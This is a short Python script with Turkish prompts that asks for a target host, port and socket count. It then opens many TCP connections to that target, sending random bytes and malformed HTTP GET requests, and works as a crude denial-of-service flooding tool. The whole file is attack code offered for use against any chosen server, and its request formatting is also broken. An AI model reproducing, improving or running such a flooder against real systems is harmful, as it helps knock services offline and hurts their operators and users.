from email import header
import sys
import os
import socket
import time
import random

def send_http(target,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))
    s.settimeout(4)
    s.send(os.urandom(1024))
    _header = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
                "Accept-Language: en-us,en;q=0.5"]
    line = f"GET /?{random.randint(0, 2000)} HTTP/1.1"            
    s.send(line.encode("utf-8"))            
    s.send(_header[0].encode("utf-8"))
    s.send(_header[1].encode("utf-8"))


target = input("Hedef URL : ")
port = int(input("Hedef port : "))
socket_count = int(input("Socket sayısı : "))
for i in range(socket_count):
    print("Http paketi gönderiliyor.. "+str(i)+" .soket")
    send_http(target,port)
